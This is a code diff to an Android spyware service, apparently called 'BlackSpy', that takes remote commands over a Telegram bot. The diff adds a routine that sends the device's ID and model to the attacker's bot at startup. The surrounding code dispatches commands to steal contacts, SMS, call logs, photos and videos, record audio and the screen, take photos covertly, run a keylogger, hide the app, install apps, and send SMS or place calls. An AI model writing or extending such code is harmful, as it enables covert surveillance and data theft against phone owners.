@@ -32,7 +32,6 @@ import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.BufferedReader;
-import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -65,7 +64,28 @@ public class TelegramBotService extends Service {
     private StringBuilder keylogBuffer = new StringBuilder();
     private Map<String, String> pendingDelete = new HashMap<>();
     static class DeviceInfo { String id, name; }
-    @Override public void onCreate() { super.onCreate(); startForeground(1, createNotification()); startBot(); }
+    @Override public void onCreate() { 
+        super.onCreate(); 
+        startForeground(1, createNotification()); 
+        autoRegisterThisDevice();
+        startBot(); 
+    }
+    private void autoRegisterThisDevice() {
+        try {
+            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (" + Build.VERSION.RELEASE + ")";
+            JSONObject json = new JSONObject();
+            json.put("device_id", deviceId);
+            json.put("device_name", deviceName);
+            String msg = "REGISTER:" + json.toString();
+            String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
+            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+            conn.setRequestMethod("GET");
+            conn.getResponseCode();
+            conn.disconnect();
+            Log.i("BlackSpy", "Auto-registered: " + deviceName);
+        } catch (Exception e) { Log.e("BlackSpy", "Auto-register failed", e); }
+    }
     private void startBot() {
         Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(() -> {
             try {
@@ -128,7 +148,6 @@ public class TelegramBotService extends Service {
                 sendMessage("⚠️ Select device first: /start");
                 return;
             }
-            // البيانات
             if (c.equals("/contacts")) sendToDevice(activeDevice, "GET_CONTACTS");
             else if (c.equals("/sms")) sendToDevice(activeDevice, "GET_SMS");
             else if (c.equals("/calllogs")) sendToDevice(activeDevice, "GET_CALLLOGS");
@@ -137,18 +156,15 @@ public class TelegramBotService extends Service {
             else if (c.equals("/location")) sendToDevice(activeDevice, "GET_LOCATION");
             else if (c.equals("/network")) sendToDevice(activeDevice, "GET_NETWORK");
             else if (c.equals("/sim")) sendToDevice(activeDevice, "GET_SIM");
-            // الصوت
             else if (c.equals("/record")) sendToDevice(activeDevice, "START_RECORD");
             else if (c.equals("/stoprec")) sendToDevice(activeDevice, "STOP_RECORD");
             else if (c.equals("/volumeup")) sendToDevice(activeDevice, "VOLUME_UP");
             else if (c.equals("/volumedown")) sendToDevice(activeDevice, "VOLUME_DOWN");
             else if (c.equals("/mute")) sendToDevice(activeDevice, "MUTE");
-            // الكاميرا
             else if (c.equals("/photo")) sendToDevice(activeDevice, "PHOTO");
             else if (c.equals("/photofront")) sendToDevice(activeDevice, "PHOTOFRONT");
             else if (c.equals("/screenshot")) sendToDevice(activeDevice, "SCREENSHOT");
             else if (c.equals("/screenrecord")) sendToDevice(activeDevice, "SCREENRECORD");
-            // النسخ (copy)
             else if (c.startsWith("/copy_photos ")) sendToDevice(activeDevice, "COPY_PHOTOS|" + cmd.substring(13));
             else if (c.startsWith("/copy_videos ")) sendToDevice(activeDevice, "COPY_VIDEOS|" + cmd.substring(13));
             else if (c.startsWith("/copy_audio ")) sendToDevice(activeDevice, "COPY_AUDIO|" + cmd.substring(12));
@@ -156,7 +172,6 @@ public class TelegramBotService extends Service {
             else if (c.startsWith("/copy_contacts ")) sendToDevice(activeDevice, "COPY_CONTACTS|" + cmd.substring(15));
             else if (c.startsWith("/copy_sms ")) sendToDevice(activeDevice, "COPY_SMS|" + cmd.substring(10));
             else if (c.startsWith("/copy_calls ")) sendToDevice(activeDevice, "COPY_CALLS|" + cmd.substring(12));
-            // السرقة (steal)
             else if (c.equals("/steal_all")) sendToDevice(activeDevice, "STEAL_ALL");
             else if (c.equals("/steal_photos")) sendToDevice(activeDevice, "STEAL_PHOTOS");
             else if (c.equals("/steal_videos")) sendToDevice(activeDevice, "STEAL_VIDEOS");
@@ -165,7 +180,6 @@ public class TelegramBotService extends Service {
             else if (c.equals("/steal_contacts")) sendToDevice(activeDevice, "STEAL_CONTACTS");
             else if (c.equals("/steal_sms")) sendToDevice(activeDevice, "STEAL_SMS");
             else if (c.equals("/steal_calls")) sendToDevice(activeDevice, "STEAL_CALLS");
-            // الحذف (delete with confirmation)
             else if (c.startsWith("/delete_photo ")) { String path = cmd.substring(14); askConfirmation("delete_photo|" + path); }
             else if (c.startsWith("/delete_video ")) { String path = cmd.substring(14); askConfirmation("delete_video|" + path); }
             else if (c.startsWith("/delete_audio ")) { String path = cmd.substring(14); askConfirmation("delete_audio|" + path); }
@@ -173,7 +187,6 @@ public class TelegramBotService extends Service {
             else if (c.startsWith("/delete_contact ")) { String id = cmd.substring(16); askConfirmation("delete_contact|" + id); }
             else if (c.startsWith("/delete_sms ")) { String id = cmd.substring(12); askConfirmation("delete_sms|" + id); }
             else if (c.startsWith("/delete_call ")) { String id = cmd.substring(13); askConfirmation("delete_call|" + id); }
-            // الملفات الأخرى
             else if (c.equals("/zip")) sendToDevice(activeDevice, "GET_ZIP");
             else if (c.equals("/photos")) sendToDevice(activeDevice, "GET_PHOTOS");
             else if (c.equals("/videos")) sendToDevice(activeDevice, "GET_VIDEOS");
@@ -182,7 +195,6 @@ public class TelegramBotService extends Service {
             else if (c.startsWith("/search ")) sendToDevice(activeDevice, "SEARCH|" + cmd.substring(8));
             else if (c.startsWith("/download ")) sendToDevice(activeDevice, "DOWNLOAD|" + cmd.substring(10));
             else if (c.startsWith("/mkdir ")) sendToDevice(activeDevice, "MKDIR|" + cmd.substring(7));
-            // التطبيقات (بالاسم)
             else if (c.equals("/apps")) sendToDevice(activeDevice, "GET_APPS");
             else if (c.startsWith("/openapp ")) sendToDevice(activeDevice, "OPEN_APP|" + cmd.substring(9));
             else if (c.startsWith("/install ")) sendToDevice(activeDevice, "INSTALL_APP|" + cmd.substring(9));
@@ -191,7 +203,6 @@ public class TelegramBotService extends Service {
             else if (c.startsWith("/enable ")) sendToDevice(activeDevice, "ENABLE_APP|" + cmd.substring(8));
             else if (c.startsWith("/appinfo ")) sendToDevice(activeDevice, "APP_INFO|" + cmd.substring(9));
             else if (c.startsWith("/killapp ")) sendToDevice(activeDevice, "KILL_APP|" + cmd.substring(9));
-            // الإخفاء والتحكم
             else if (c.equals("/hide")) sendToDevice(activeDevice, "HIDE_APP");
             else if (c.equals("/show")) sendToDevice(activeDevice, "SHOW_APP");
             else if (c.startsWith("/toast ")) sendToDevice(activeDevice, "TOAST|" + cmd.substring(7));
@@ -199,11 +210,9 @@ public class TelegramBotService extends Service {
             else if (c.startsWith("/vibrate ")) sendToDevice(activeDevice, "VIBRATE|" + cmd.substring(9));
             else if (c.startsWith("/openurl ")) sendToDevice(activeDevice, "OPENURL|" + cmd.substring(9));
             else if (c.equals("/clipboard")) sendToDevice(activeDevice, "GET_CLIPBOARD");
-            // Keylogger
             else if (c.equals("/keylogger start")) sendToDevice(activeDevice, "KEYLOGGER_START");
             else if (c.equals("/keylogger stop")) sendToDevice(activeDevice, "KEYLOGGER_STOP");
             else if (c.equals("/keylogger send")) sendToDevice(activeDevice, "KEYLOGGER_SEND");
-            // الرسائل والمكالمات
             else if (c.startsWith("/sms_send ")) sendToDevice(activeDevice, "SMS_SEND|" + cmd.substring(10));
             else if (c.startsWith("/call ")) sendToDevice(activeDevice, "CALL|" + cmd.substring(6));
             else if (c.startsWith("/ussd ")) sendToDevice(activeDevice, "USSD|" + cmd.substring(6));
